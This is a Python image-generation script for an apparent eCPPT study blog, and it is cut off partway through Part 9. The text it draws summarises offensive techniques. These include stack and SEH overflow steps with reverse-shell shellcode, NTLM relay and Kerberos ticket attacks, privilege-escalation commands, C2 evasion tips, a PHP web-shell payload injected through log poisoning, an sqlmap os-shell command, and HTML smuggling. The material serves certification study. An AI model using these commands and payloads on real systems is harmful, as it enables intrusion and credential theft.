import os
from PIL import Image, ImageDraw, ImageFont

out_dir = "assets/images/posts/ecppt"
os.makedirs(out_dir, exist_ok=True)

# Robust cross-platform fonts
def load_font(font_names, size):
    for f in font_names:
        if os.path.exists(f):
            try:
                return ImageFont.truetype(f, size)
            except Exception:
                pass
        try:
            return ImageFont.truetype(f, size)
        except Exception:
            pass
    return ImageFont.load_default()

FONT_TITLE = load_font(["C:/Windows/Fonts/segoeuib.ttf", "C:/Windows/Fonts/arialbd.ttf", "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf"], 22)
FONT_SUB = load_font(["C:/Windows/Fonts/segoeui.ttf", "C:/Windows/Fonts/arial.ttf", "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"], 13)
FONT_BOLD = load_font(["C:/Windows/Fonts/segoeuib.ttf", "C:/Windows/Fonts/arialbd.ttf", "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf"], 14)
FONT_REGULAR = load_font(["C:/Windows/Fonts/segoeui.ttf", "C:/Windows/Fonts/arial.ttf", "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"], 12)
FONT_CODE = load_font(["C:/Windows/Fonts/consolab.ttf", "C:/Windows/Fonts/courbd.ttf", "/usr/share/fonts/truetype/liberation/LiberationMono-Bold.ttf"], 11)

def create_base(width, height, title, subtitle):
    img = Image.new("RGBA", (width, height), (13, 17, 23, 255))
    draw = ImageDraw.Draw(img)
    # Subtle gradient
    for y in range(height):
        factor = y / height
        r = int(12 + factor * 6)
        g = int(16 + factor * 8)
        b = int(24 + factor * 12)
        draw.line([(0, y), (width, y)], fill=(r, g, b, 255))
    # Subtle grid
    for x in range(0, width, 44):
        draw.line([(x, 0), (x, height)], fill=(30, 41, 59, 35), width=1)
    for y in range(0, height, 44):
        draw.line([(0, y), (width, y)], fill=(30, 41, 59, 35), width=1)
    # Header row
    draw.text((45, 24), title, fill=(240, 246, 252, 255), font=FONT_TITLE)
    draw.text((45, 54), subtitle, fill=(148, 163, 184, 255), font=FONT_SUB)
    draw.line([(45, 80), (width - 45, 80)], fill=(51, 65, 85, 200), width=1)
    return img, draw

# 1. Part 1: System Security & x86 Assembly
def gen_part1():
    img, draw = create_base(1100, 620, "PART 1: IA-32 VIRTUAL MEMORY & STACK FRAME ARCHITECTURE", "Process Memory Segmentation, Stack Call Frames, and Function Prologue/Epilogue Boundaries")
    
    # Left Box: Process Memory Map
    draw.rounded_rectangle([(45, 100), (520, 500)], radius=8, fill=(15, 23, 42, 220), outline=(56, 189, 248, 200), width=2)
    draw.text((65, 115), "32-Bit Process Virtual Memory (4 GB Space)", fill=(56, 189, 248), font=FONT_BOLD)
    
    mem_segments = [
        ("0xFFFFFFFF - Kernel Space (1GB / 2GB)", "Ring 0 Drivers, Syscalls, Page Tables", (239, 68, 68)),
        ("0xBFFFFFFF - Call Stack (Stack Segment)", "Grows DOWN [Local Vars, Saved EBP, Ret EIP]", (56, 189, 248)),
        ("Unallocated / Guard Pages", "Dynamically paged virtual address boundaries", (100, 116, 139)),
        ("0x08048000 - Heap Segment", "Grows UP [Dynamic malloc, HeapAlloc]", (245, 158, 11)),
        ("Uninitialized Data (.bss)", "Global variables initialized to zero", (168, 85, 247)),
        ("Initialized Data (.data)", "Global & static variables with initial values", (16, 185, 129)),
        ("0x00400000 - Text Segment (.text)", "Machine Instructions (Read & Execute ONLY)", (59, 130, 246)),
        ("0x00000000 - Null Pointer Trap Page", "Catch null pointer dereferences (Inaccessible)", (148, 163, 184))
    ]
    my = 145
    for title, desc, col in mem_segments:
        draw.rounded_rectangle([(65, my), (500, my + 38)], radius=4, fill=(col[0], col[1], col[2], 25), outline=col, width=1)
        draw.text((75, my + 4), title, fill=col, font=FONT_CODE)
        draw.text((75, my + 20), desc, fill=(203, 213, 225), font=FONT_REGULAR)
        my += 43

    # Right Box: Stack Frame Anatomy
    draw.rounded_rectangle([(545, 100), (1055, 500)], radius=8, fill=(15, 23, 42, 220), outline=(16, 185, 129, 200), width=2)
    draw.text((565, 115), "Stack Frame Anatomy & Register Offsets", fill=(16, 185, 129), font=FONT_BOLD)
    
    stack_layers = [
        ("[ebp + 12] Parameter 2 (Arg2)", "Pushed by caller prior to CALL instruction", (148, 163, 184)),
        ("[ebp + 8]  Parameter 1 (Arg1)", "Pushed by caller prior to CALL instruction", (148, 163, 184)),
        ("[ebp + 4]  Saved EIP (Return Address)", "Pushed by CALL -> Primary BOF Hijack Target!", (239, 68, 68)),
        ("[ebp]      Saved Old EBP (Frame Anchor)", "Pushed by function prologue (push ebp)", (245, 158, 11)),
        ("[ebp - 4]  Local Variable 1", "Local integer / pointer initialized by function", (56, 189, 248)),
        ("[ebp - 64] Local Buffer (char[64])", "Target of strcpy / gets overflow attacks!", (236, 72, 153)),
        ("ESP -----> Top of Stack (Current)", "Decrements with PUSH, increments with POP", (16, 185, 129))
    ]
    sy = 145
    for title, desc, col in stack_layers:
        draw.rounded_rectangle([(565, sy), (1035, sy + 44)], radius=4, fill=(col[0], col[1], col[2], 25), outline=col, width=1)
        draw.text((575, sy + 5), title, fill=col, font=FONT_CODE)
        draw.text((575, sy + 24), desc, fill=(203, 213, 225), font=FONT_REGULAR)
        sy += 49

    # Bottom Banner: Calling Conventions
    draw.rounded_rectangle([(45, 520), (1055, 595)], radius=6, fill=(30, 41, 59, 180), outline=(71, 85, 105), width=1)
    draw.text((65, 530), "FUNCTION PROLOGUE: push ebp; mov ebp, esp; sub esp, 0x40   |   EPILOGUE: mov esp, ebp; pop ebp; ret", fill=(245, 158, 11), font=FONT_CODE)
    draw.text((65, 555), "CONVENTIONS: __cdecl (Caller cleans via add esp, N) | __stdcall (Callee cleans via ret N) | Little-Endian: LSB at lowest address", fill=(148, 163, 184), font=FONT_REGULAR)
    draw.text((65, 575), "EXPLOIT LINK: Corrupting Local Buffer across Saved EBP allows arbitrary overwrite of Saved EIP at [ebp + 4].", fill=(239, 68, 68), font=FONT_REGULAR)
    
    img.save(f"{out_dir}/part-1-diagram.png", "PNG")
    print("Generated part-1-diagram.png")

# 2. Part 2: Exploit Development Buffer Overflows
def gen_part2():
    img, draw = create_base(1100, 620, "PART 2: STACK-BASED & SEH BUFFER OVERFLOW PIPELINE", "The 6-Step Exploitation Lifecycle, Mona.py Gadget Hunting, and SEH POP POP RET Overwrite")
    
    steps = [
        ("Step 1: Network Fuzzing", "Python socket script sends growing buffers (100B, 200B...) to identify crash threshold.", (56, 189, 248), 45, 100),
        ("Step 2: Offset Calculation", "Transmit cyclic De Bruijn pattern via msf-pattern_create; calculate offset via msf-pattern_offset.", (168, 85, 247), 295, 100),
        ("Step 3: Verify EIP Control", "Inject payload: 'A'*Offset + 'B'*4 + 'C'*300; verify debugger registers show EIP == 0x42424242.", (245, 158, 11), 555, 100),
        ("Step 4: Bad Characters Audit", "!mona bytearray -b '\\x00'; compare memory array against clean reference to isolate bad bytes.", (239, 68, 68), 815, 100)
    ]
    for title, desc, col, x, y in steps:
        draw.rounded_rectangle([(x, y), (x + 240, y + 170)], radius=8, fill=(col[0], col[1], col[2], 25), outline=col, width=2)
        draw.text((x + 15, y + 15), title, fill=col, font=FONT_BOLD)
        draw.text((x + 15, y + 45), desc, fill=(203, 213, 225), font=FONT_REGULAR)

    # Middle SEH Overwrite Anatomy
    draw.rounded_rectangle([(45, 290), (1055, 470)], radius=8, fill=(15, 23, 42, 220), outline=(236, 72, 153), width=2)
    draw.text((65, 305), "Structured Exception Handling (SEH) Overwrite Execution Flow", fill=(236, 72, 153), font=FONT_BOLD)
    
    seh_boxes = [
        ("1. Buffer Overflow", "Payload overflows stack buffer, corrupting nSEH and SEH Handler pointers", (148, 163, 184), 65),
        ("2. nSEH Overwrite", "Short Jump: \\xeb\\x06\\x90\\x90 (Hops 6 bytes over SEH Handler)", (56, 189, 248), 310),
        ("3. SEH Handler", "POP POP RET gadget from non-SafeSEH DLL (Pivots execution to nSEH)", (239, 68, 68), 565),
        ("4. NOP Sled & Shellcode", "32-byte \\x90 NOP sled leads directly to msfvenom reverse shell!", (16, 185, 129), 815)
    ]
    for stitle, sdesc, scol, sx in seh_boxes:
        draw.rounded_rectangle([(sx, 340), (sx + 230, 450)], radius=6, fill=(scol[0], scol[1], scol[2], 25), outline=scol, width=1)
        draw.text((sx + 10, 350), stitle, fill=scol, font=FONT_BOLD)
        draw.text((sx + 10, 380), sdesc, fill=(203, 213, 225), font=FONT_REGULAR)

    # Bottom MITIGATION BAR
    draw.rounded_rectangle([(45, 490), (1055, 595)], radius=6, fill=(30, 41, 59, 180), outline=(71, 85, 105), width=1)
    draw.text((65, 502), "MODERN MITIGATION CHEAT SHEET:", fill=(245, 158, 11), font=FONT_CODE)
    draw.text((65, 525), "• DEP/NX: Non-executable stack/heap -> Bypassed via ROP (Return-Oriented Programming) chaining VirtualProtect()", fill=(203, 213, 225), font=FONT_REGULAR)
    draw.text((65, 545), "• ASLR: Randomized base addresses -> Bypassed via non-ASLR third-party modules or memory info leaks", fill=(203, 213, 225), font=FONT_REGULAR)
    draw.text((65, 565), "• SafeSEH & Canaries: Verified handler tables & stack cookies -> Bypassed via SEH before canary checks or exception hijacking", fill=(203, 213, 225), font=FONT_REGULAR)

    img.save(f"{out_dir}/part-2-diagram.png", "PNG")
    print("Generated part-2-diagram.png")

# 3. Part 3: Network Pentesting
def gen_part3():
    img, draw = create_base(1100, 620, "PART 3: NETWORK RECONNAISSANCE & ATTACK ARCHITECTURE", "Wire-Level Port Scanning, Protocol Exploitation Matrix, and LLMNR/NBT-NS Poisoning & Relay")
    
    # Left: Wire Scanning
    draw.rounded_rectangle([(45, 100), (520, 350)], radius=8, fill=(15, 23, 42, 220), outline=(56, 189, 248), width=2)
    draw.text((65, 115), "Wire-Level Scanning Handshakes", fill=(56, 189, 248), font=FONT_BOLD)
    draw.text((65, 145), "TCP Connect Scan (-sT):", fill=(245, 158, 11), font=FONT_BOLD)
    draw.text((65, 165), "  Scanner --(SYN)--> Target\n  Target  --(SYN/ACK)--> Scanner (Open)\n  Scanner --(ACK)--> Target [Session Logged]\n  Scanner --(RST/ACK)--> Target", fill=(203, 213, 225), font=FONT_CODE)
    draw.text((65, 245), "TCP SYN Stealth Scan (-sS):", fill=(16, 185, 129), font=FONT_BOLD)
    draw.text((65, 265), "  Scanner --(SYN)--> Target\n  Target  --(SYN/ACK)--> Scanner (Open)\n  Scanner --(RST)--> Target [Half-Open: No App Log!]", fill=(203, 213, 225), font=FONT_CODE)

    # Right: Service Enumeration Matrix
    draw.rounded_rectangle([(545, 100), (1055, 350)], radius=8, fill=(15, 23, 42, 220), outline=(168, 85, 247), width=2)
    draw.text((565, 115), "Critical Protocol Enumeration Matrix", fill=(168, 85, 247), font=FONT_BOLD)
    services = [
        ("SNMP (161/UDP)", "Community strings (public/private), MIB tree walks, usernames", (245, 158, 11)),
        ("DNS (53/TCP)", "AXFR Zone Transfers: dig axfr @target domain (Full network map)", (56, 189, 248)),
        ("SMB (445/TCP)", "Null sessions, IPC$ shares, RID cycling via enum4linux-ng", (16, 185, 129)),
        ("SMTP (25/TCP)", "VRFY / EXPN / RCPT TO user enumeration queries", (239, 68, 68))
    ]
    py = 145
    for sname, sdesc, scol in services:
        draw.text((565, py), f"• {sname}:", fill=scol, font=FONT_BOLD)
        draw.text((580, py + 20), sdesc, fill=(203, 213, 225), font=FONT_REGULAR)
        py += 48

    # Bottom: LLMNR Poisoning & SMB Relay
    draw.rounded_rectangle([(45, 370), (1055, 595)], radius=8, fill=(15, 23, 42, 220), outline=(239, 68, 68), width=2)
    draw.text((65, 385), "LLMNR / NBT-NS Poisoning and SMB Relaying Workflow", fill=(239, 68, 68), font=FONT_BOLD)
    
    flow_steps = [
        ("1. Typo / Failed DNS", "Victim types \\\\corpshare\nDNS fails -> Windows sends\nlocal broadcast query via\nLLMNR/NBT-NS on UDP 5355", (148, 163, 184), 65),
        ("2. Responder Spoof", "Responder intercepts request\nand replies: 'I am corpshare!'\nForces NTLMSSP challenge\nexchange with victim", (245, 158, 11), 310),
        ("3. NetNTLMv2 Capture", "Captures NetNTLMv2 hash\nCrack offline via Hashcat:\nhashcat -m 5600 hash.txt\nrockyou.txt -O", (236, 72, 153), 565),
        ("4. Real-Time SMB Relay", "ntlmrelayx forwards auth\nto target server with\nSMB Signing Disabled\n-> Spawns SOCKS proxy!", (16, 185, 129), 815)
    ]
    for ftitle, fdesc, fcol, fx in flow_steps:
        draw.rounded_rectangle([(fx, 415), (fx + 230, 575)], radius=6, fill=(fcol[0], fcol[1], fcol[2], 25), outline=fcol, width=1)
        draw.text((fx + 10, 425), ftitle, fill=fcol, font=FONT_BOLD)
        lines = fdesc.split("\n")
        ly = 455
        for l in lines:
            draw.text((fx + 10, ly), l, fill=(203, 213, 225), font=FONT_REGULAR)
            ly += 22

    img.save(f"{out_dir}/part-3-diagram.png", "PNG")
    print("Generated part-3-diagram.png")

# 4. Part 4: Active Directory
def gen_part4():
    img, draw = create_base(1100, 620, "PART 4: ACTIVE DIRECTORY KERBEROS & PERSISTENCE MATRIX", "Kerberos 5-Step Protocol Mechanics, BloodHound Attack Paths, and Golden/Silver Tickets")
    
    # 3 Columns: 1. Kerberos Flow, 2. Roasting Attacks, 3. Persistence
    cols = [
        ("1. Kerberos 5-Step Flow", [
            "• AS-REQ: Client -> KDC (Timestamp enc)",
            "• AS-REP: KDC -> Client (TGT returned)",
            "• TGS-REQ: Client -> KDC (Presents TGT)",
            "• TGS-REP: KDC -> Client (Service Ticket)",
            "• AP-REQ: Client -> Service (Auth session)"
        ], (56, 189, 248), 45),
        ("2. Roasting Attack Points", [
            "• Kerberoasting: Request SPN ticket,",
            "  extract TGS, crack offline with",
            "  Hashcat mode 13100 (RC4/AES).",
            "• AS-REP Roasting: Target accounts with",
            "  DONT_REQ_PREAUTH flag; KDC sends",
            "  AS-REP without auth; crack mode 18200."
        ], (245, 158, 11), 385),
        ("3. Domain Persistence", [
            "• DCSync: Impersonate DC via DRS API",
            "  (DS-Replication-Get-Changes-All).",
            "• Golden Ticket: Forged TGT using krbtgt",
            "  NTLM hash; valid for 10 years.",
            "• Silver Ticket: Forged TGS using service",
            "  NTLM hash; completely silent to DC."
        ], (239, 68, 68), 725)
    ]
    for ctitle, citems, ccol, cx in cols:
        draw.rounded_rectangle([(cx, 100), (cx + 330, 360)], radius=8, fill=(ccol[0], ccol[1], ccol[2], 25), outline=ccol, width=2)
        draw.text((cx + 15, 115), ctitle, fill=ccol, font=FONT_BOLD)
        cy = 150
        for it in citems:
            draw.text((cx + 15, cy), it, fill=(203, 213, 225), font=FONT_REGULAR)
            cy += 30

    # Bottom: BloodHound Graph Flow
    draw.rounded_rectangle([(45, 380), (1055, 595)], radius=8, fill=(15, 23, 42, 220), outline=(168, 85, 247), width=2)
    draw.text((65, 395), "BloodHound Shortest Attack Path to Domain Admin", fill=(168, 85, 247), font=FONT_BOLD)
    
    bh_nodes = [
        ("Compromised User", "Initial foothold: jsmith\nStandard domain user", (148, 163, 184), 65),
        ("Security Group", "MemberOf HelpDesk\nInherited delegation", (56, 189, 248), 310),
        ("AdminTo Workstation", "Local Admin on IT-PC\nActive DA session token", (245, 158, 11), 565),
        ("Domain Admin (DC01)", "Mimikatz token steal\nFull Forest Compromise!", (239, 68, 68), 815)
    ]
    for btitle, bdesc, bcol, bx in bh_nodes:
        draw.rounded_rectangle([(bx, 430), (bx + 230, 565)], radius=6, fill=(bcol[0], bcol[1], bcol[2], 25), outline=bcol, width=1)
        draw.text((bx + 10, 440), btitle, fill=bcol, font=FONT_BOLD)
        lines = bdesc.split("\n")
        ly = 475
        for l in lines:
            draw.text((bx + 10, ly), l, fill=(203, 213, 225), font=FONT_REGULAR)
            ly += 22

    img.save(f"{out_dir}/part-4-diagram.png", "PNG")
    print("Generated part-4-diagram.png")

# 5. Part 5: Privilege Escalation Playbook
def gen_part5():
    img, draw = create_base(1100, 620, "PART 5: WINDOWS & LINUX PRIVILEGE ESCALATION PLAYBOOK", "Token Impersonation (Potatoes), Service Misconfigurations, SUID/PATH Hijacking, and Sudo Exploitation")
    
    # Left: Windows PrivEsc
    draw.rounded_rectangle([(45, 100), (530, 500)], radius=8, fill=(15, 23, 42, 220), outline=(56, 189, 248), width=2)
    draw.text((65, 115), "Windows Privilege Escalation Vectors", fill=(56, 189, 248), font=FONT_BOLD)
    win_vectors = [
        ("Token Impersonation (Potatoes)", "SeImpersonatePrivilege -> Coerce SYSTEM to rogue named pipe -> PrintSpoofer.exe / GodPotato.exe", (239, 68, 68)),
        ("Insecure Service Permissions", "Weak DACL allows sc config binpath= 'attacker.exe'; unquoted paths with spaces exploited", (245, 158, 11)),
        ("AlwaysInstallElevated", "Registry HKLM & HKCU keys enabled (0x1) -> msiexec /quiet /qn /i evil.msi runs as SYSTEM", (168, 85, 247)),
        ("Silent UAC Bypasses", "Auto-elevating binaries (fodhelper.exe, sdclt.exe) hijack HKCU\\Software\\Classes\\ms-settings", (16, 185, 129)),
        ("Credential Harvesting (LSASS)", "Dump lsass.exe via procdump or Mimikatz sekurlsa::logonpasswords to steal cleartext/hashes", (236, 72, 153))
    ]
    wy = 145
    for wtitle, wdesc, wcol in win_vectors:
        draw.rounded_rectangle([(65, wy), (510, wy + 58)], radius=4, fill=(wcol[0], wcol[1], wcol[2], 25), outline=wcol, width=1)
        draw.text((75, wy + 6), wtitle, fill=wcol, font=FONT_BOLD)
        draw.text((75, wy + 28), wdesc, fill=(203, 213, 225), font=FONT_REGULAR)
        wy += 68

    # Right: Linux PrivEsc
    draw.rounded_rectangle([(570, 100), (1055, 500)], radius=8, fill=(15, 23, 42, 220), outline=(16, 185, 129), width=2)
    draw.text((590, 115), "Linux Privilege Escalation Vectors", fill=(16, 185, 129), font=FONT_BOLD)
    lin_vectors = [
        ("SUID Binaries & GTFOBins", "find / -perm -u=s; cross-reference utilities (find, bash, vim) on GTFOBins to spawn root shell", (56, 189, 248)),
        ("PATH Variable Hijacking", "Custom SUID invoking relative command (service) -> Prepend /tmp to PATH to run rogue script", (245, 158, 11)),
        ("Sudo Misconfigurations & LD_PRELOAD", "sudo -l checks NOPASSWD; if env_keep+=LD_PRELOAD active, inject malicious .so shared library", (239, 68, 68)),
        ("Linux Capabilities", "getcap -r /; binaries with cap_setuid+ep (e.g., python3) allow os.setuid(0) elevation", (168, 85, 247)),
        ("Writable /etc/passwd", "Generate SHA-512 hash via openssl passwd -1; append custom user with UID 0 (root equivalent)", (236, 72, 153))
    ]
    ly = 145
    for ltitle, ldesc, lcol in lin_vectors:
        draw.rounded_rectangle([(590, ly), (1035, ly + 58)], radius=4, fill=(lcol[0], lcol[1], lcol[2], 25), outline=lcol, width=1)
        draw.text((600, ly + 6), ltitle, fill=lcol, font=FONT_BOLD)
        draw.text((600, ly + 28), ldesc, fill=(203, 213, 225), font=FONT_REGULAR)
        ly += 68

    # Bottom Decision Bar
    draw.rounded_rectangle([(45, 520), (1055, 595)], radius=6, fill=(30, 41, 59, 180), outline=(71, 85, 105), width=1)
    draw.text((65, 532), "AUTOMATED AUDITORS: WinPEAS.exe, PowerUp.ps1, Seatbelt (Windows)  |  LinPEAS.sh, LinEnum.sh (Linux)", fill=(245, 158, 11), font=FONT_CODE)
    draw.text((65, 560), "OPERATIONAL RULE: Always escalate to local root/SYSTEM before attempting network pivoting or credential dumping.", fill=(239, 68, 68), font=FONT_REGULAR)

    img.save(f"{out_dir}/part-5-diagram.png", "PNG")
    print("Generated part-5-diagram.png")

# 6. Part 6: Lateral Movement & Pivoting
def gen_part6():
    img, draw = create_base(1100, 620, "PART 6: MULTI-TIER PIVOTING & LATERAL MOVEMENT TOPOLOGY", "Enterprise DMZ Segmentation, SSH Tunneling, Ligolo-ng Layer-3 TUN Routing, and WinRM/WMI")
    
    # Network Segment Topology
    nodes = [
        ("Attacker (Kali)", "10.10.14.5\nDirect Internet", (239, 68, 68), 45),
        ("DMZ Pivot 1", "NIC 1: 10.10.10.50\nNIC 2: 172.16.1.10", (245, 158, 11), 310),
        ("Internal App Server", "NIC 1: 172.16.1.20\nNIC 2: 192.168.100.5", (56, 189, 248), 565),
        ("Isolated Core DB", "192.168.100.50\nMySQL Port 3306", (16, 185, 129), 815)
    ]
    for ntitle, ndesc, ncol, nx in nodes:
        draw.rounded_rectangle([(nx, 100), (nx + 230, 200)], radius=8, fill=(ncol[0], ncol[1], ncol[2], 25), outline=ncol, width=2)
        draw.text((nx + 15, 115), ntitle, fill=ncol, font=FONT_BOLD)
        lines = ndesc.split("\n")
        draw.text((nx + 15, 145), lines[0], fill=(203, 213, 225), font=FONT_REGULAR)
        draw.text((nx + 15, 168), lines[1], fill=ncol, font=FONT_CODE)

    # Middle Comparison: SSH vs Ligolo-ng
    draw.rounded_rectangle([(45, 220), (530, 480)], radius=8, fill=(15, 23, 42, 220), outline=(56, 189, 248), width=2)
    draw.text((65, 235), "SSH Port Forwarding Trifecta", fill=(56, 189, 248), font=FONT_BOLD)
    draw.text((65, 265), "• Local (-L): ssh -L 8080:172.16.1.50:80 user@pivot\n  Access internal web port on Kali localhost:8080.", fill=(203, 213, 225), font=FONT_REGULAR)
    draw.text((65, 330), "• Remote (-R): ssh -R 4444:10.10.14.5:4444 user@pivot\n  Exposes Kali listener backwards to internal hosts.", fill=(203, 213, 225), font=FONT_REGULAR)
    draw.text((65, 395), "• Dynamic (-D): ssh -D 9050 user@pivot\n  Creates SOCKS5 proxy routed through proxychains.", fill=(203, 213, 225), font=FONT_REGULAR)

    draw.rounded_rectangle([(570, 220), (1055, 480)], radius=8, fill=(15, 23, 42, 220), outline=(16, 185, 129), width=2)
    draw.text((590, 235), "Ligolo-ng High-Performance L3 Routing", fill=(16, 185, 129), font=FONT_BOLD)
    draw.text((590, 265), "• Creates virtual TUN interface on Kali (dev ligolo)", fill=(203, 213, 225), font=FONT_REGULAR)
    draw.text((590, 300), "• Connects lightweight agent from pivot back to proxy", fill=(203, 213, 225), font=FONT_REGULAR)
    draw.text((590, 335), "• Adds native OS route: sudo ip route add 172.16.1.0/24 dev ligolo", fill=(245, 158, 11), font=FONT_CODE)
    draw.text((590, 375), "• Full Nmap SYN scans (-sS) and ICMP ping work natively!\n  Eliminates proxychains lag and unstable socket drops.", fill=(16, 185, 129), font=FONT_REGULAR)

    # Bottom Lateral Movement Methods
    draw.rounded_rectangle([(45, 500), (1055, 595)], radius=6, fill=(30, 41, 59, 180), outline=(71, 85, 105), width=1)
    draw.text((65, 512), "WINDOWS LATERAL MOVEMENT PROTOCOLS:", fill=(245, 158, 11), font=FONT_CODE)
    draw.text((65, 535), "• Evil-WinRM (Port 5985): Native remote PowerShell management   |   • WMIExec (Port 135/445): Agentless process creation via DCOM", fill=(203, 213, 225), font=FONT_REGULAR)
    draw.text((65, 560), "• PsExec (Port 445): Creates PSEXESVC service for SYSTEM shell  |   • RDP (Port 3389): xfreerdp /pth (Restricted Admin Mode)", fill=(203, 213, 225), font=FONT_REGULAR)

    img.save(f"{out_dir}/part-6-diagram.png", "PNG")
    print("Generated part-6-diagram.png")

# 7. Part 7: C2 Infrastructure
def gen_part7():
    img, draw = create_base(1100, 620, "PART 7: RESILIENT C2 INFRASTRUCTURE & EMPIRE WORKFLOW", "Multi-Tier Redirectors, Cloudflare Domain Fronting, Beacon Jitter, and Starkiller Management")
    
    # 4 Nodes: Targets -> Edge -> Core
    nodes = [
        ("Victim Implants", "Windows Endpoints\nEmpire / Sliver Agent\nEncrypted HTTPS Beacons", (148, 163, 184), 45),
        ("Cloudflare CDN", "Domain Fronting\nSNI: trusted.com\nHost: c2-edge.workers.dev", (56, 189, 248), 310),
        ("Apache Redirector", "mod_rewrite filtering\nInspects User-Agent & URI\n302 redirects scanners", (245, 158, 11), 565),
        ("C2 Team Server", "Empire Core / Starkiller\nHidden internal network\nEncrypted WireGuard VPN", (16, 185, 129), 815)
    ]
    for ntitle, ndesc, ncol, nx in nodes:
        draw.rounded_rectangle([(nx, 100), (nx + 230, 200)], radius=8, fill=(ncol[0], ncol[1], ncol[2], 25), outline=ncol, width=2)
        draw.text((nx + 15, 115), ntitle, fill=ncol, font=FONT_BOLD)
        lines = ndesc.split("\n")
        draw.text((nx + 15, 145), lines[0], fill=(203, 213, 225), font=FONT_REGULAR)
        draw.text((nx + 15, 168), lines[1], fill=ncol, font=FONT_CODE)

    # Middle: Empire Lifecycle
    draw.rounded_rectangle([(45, 220), (1055, 470)], radius=8, fill=(15, 23, 42, 220), outline=(236, 72, 153), width=2)
    draw.text((65, 235), "PowerShell-Empire & Starkiller Lifecycle Deconstruction", fill=(236, 72, 153), font=FONT_BOLD)
    
    elayers = [
        ("1. Listener", "uselistener http\nSet Host, Port 8080, Delay 5s, Jitter 0.3", (56, 189, 248), 65),
        ("2. Stager", "usestager multi/launcher\nGenerates base64 encoded PowerShell cradle", (168, 85, 247), 310),
        ("3. Agent Check-In", "Implant checks in in-memory\nEstablishes secure RC4/AES session", (245, 158, 11), 565),
        ("4. Post-Exploitation", "usemodule privesc/powerup/allchecks\nusemodule credentials/mimikatz", (16, 185, 129), 815)
    ]
    for etitle, edesc, ecol, ex in elayers:
        draw.rounded_rectangle([(ex, 270), (ex + 230, 440)], radius=6, fill=(ecol[0], ecol[1], ecol[2], 25), outline=ecol, width=1)
        draw.text((ex + 10, 280), etitle, fill=ecol, font=FONT_BOLD)
        lines = edesc.split("\n")
        ly = 320
        for l in lines:
            draw.text((ex + 10, ly), l, fill=(203, 213, 225), font=FONT_REGULAR)
            ly += 25

    # Bottom: Blue Team Threat Hunting
    draw.rounded_rectangle([(45, 490), (1055, 595)], radius=6, fill=(30, 41, 59, 180), outline=(71, 85, 105), width=1)
    draw.text((65, 502), "OPSEC & THREAT HUNTING DEFENSES:", fill=(245, 158, 11), font=FONT_CODE)
    draw.text((65, 525), "• JA3/JA3S Fingerprinting: Client TLS handshakes hashed by SOC; bypass via custom Go/C++ TLS malleable profiles.", fill=(203, 213, 225), font=FONT_REGULAR)
    draw.text((65, 545), "• Jitter Variance: Static sleep intervals trigger statistical anomaly alerts; apply 30-50% random jitter.", fill=(203, 213, 225), font=FONT_REGULAR)
    draw.text((65, 565), "• Malleable Profiles: Masquerade C2 telemetry within legitimate CDN headers (Google Analytics, Akamai).", fill=(203, 213, 225), font=FONT_REGULAR)

    img.save(f"{out_dir}/part-7-diagram.png", "PNG")
    print("Generated part-7-diagram.png")

# 8. Part 8: Web Pentesting
def gen_part8():
    img, draw = create_base(1100, 620, "PART 8: WEB APPLICATION PENETRATION TESTING MATRIX", "OWASP WSTG Methodology, In-Band Union SQLi, LFI Log Poisoning to RCE, and Upload Bypasses")
    
    # 3 Panels: SQLi, LFI->RCE, Upload
    panels = [
        ("In-Band Union SQL Injection", [
            "1. ORDER BY N: Find column count (e.g. 4)",
            "2. UNION SELECT 1,2,3,4: Map display cols",
            "3. Enumerate DB Schema:",
            "   database(), version(), user()",
            "4. Dump Tables & Columns:",
            "   FROM information_schema.tables",
            "5. Dump Credentials from target table"
        ], (56, 189, 248), 45),
        ("LFI to RCE via Log Poisoning", [
            "1. Identify LFI: /view.php?file=../../etc/passwd",
            "2. Verify access to server logs:",
            "   /var/log/apache2/access.log",
            "3. Inject PHP webshell via curl:",
            "   User-Agent: <?php system($_GET['c']); ?>",
            "4. Trigger code execution via LFI:",
            "   &file=/var/log/apache2/access.log&c=whoami"
        ], (245, 158, 11), 385),
        ("File Upload Bypass Vectors", [
            "1. Client-Side: Intercept in Burp Suite",
            "2. MIME-Type: Change to image/jpeg",
            "3. Extension Blacklist:",
            "   Use .phtml, .php5, .phar, .inc",
            "4. Null Byte: shell.php%00.jpg",
            "5. Image Polyglots: Inject PHP code",
            "   into JPEG metadata via exiftool"
        ], (16, 185, 129), 725)
    ]
    for ptitle, pitems, pcol, px in panels:
        draw.rounded_rectangle([(px, 100), (px + 330, 480)], radius=8, fill=(pcol[0], pcol[1], pcol[2], 25), outline=pcol, width=2)
        draw.text((px + 15, 115), ptitle, fill=pcol, font=FONT_BOLD)
        py = 155
        for it in pitems:
            draw.text((px + 15, py), it, fill=(203, 213, 225), font=FONT_CODE)
            py += 40

    # Bottom: Methodology
    draw.rounded_rectangle([(45, 500), (1055, 595)], radius=6, fill=(30, 41, 59, 180), outline=(71, 85, 105), width=1)
    draw.text((65, 512), "OWASP WSTG v4.2 TESTING PIPELINE:", fill=(245, 158, 11), font=FONT_CODE)
    draw.text((65, 535), "Subdomain Recon (Subfinder/Amass) -> Content Discovery (ffuf) -> Automated Scans (Nikto/Nuclei) -> Manual Injection Exploits.", fill=(203, 213, 225), font=FONT_REGULAR)
    draw.text((65, 560), "AUTOMATION: sqlmap -u 'target/page?id=1' --batch --level=5 --risk=3 --tamper=space2comment --os-shell", fill=(56, 189, 248), font=FONT_CODE)

    img.save(f"{out_dir}/part-8-diagram.png", "PNG")
    print("Generated part-8-diagram.png")

# 9. Part 9: Client-Side Attacks
def gen_part9():
    img, draw = create_base(1100, 620, "PART 9: CLIENT-SIDE ATTACKS & WEAPONIZATION PIPELINE", "Social Engineering Heuristics, GoPhish Infrastructure, HTML Smuggling, and MOTW Container Evasion")
    
    stages = [
        ("1. Pretext & OSINT", "LinkedIn & Hunter.io profiling\nCialdini's Heuristics:\nAuthority, Urgency, Scarcity\nRealistic IT mandate scenario", (148, 163, 184), 45),
        ("2. GoPhish Delivery", "SPF: Authorized sender IP\nDKIM: Cryptographic signature\nDMARC: Alignment enforcement\nClean inbox deliverability", (56, 189, 248), 310),
        ("3. HTML Smuggling", "Payload assembled in browser\nJavaScript Blob construction\nwindow.URL.createObjectURL\nBypasses perimeter proxies!", (245, 158, 11), 565),
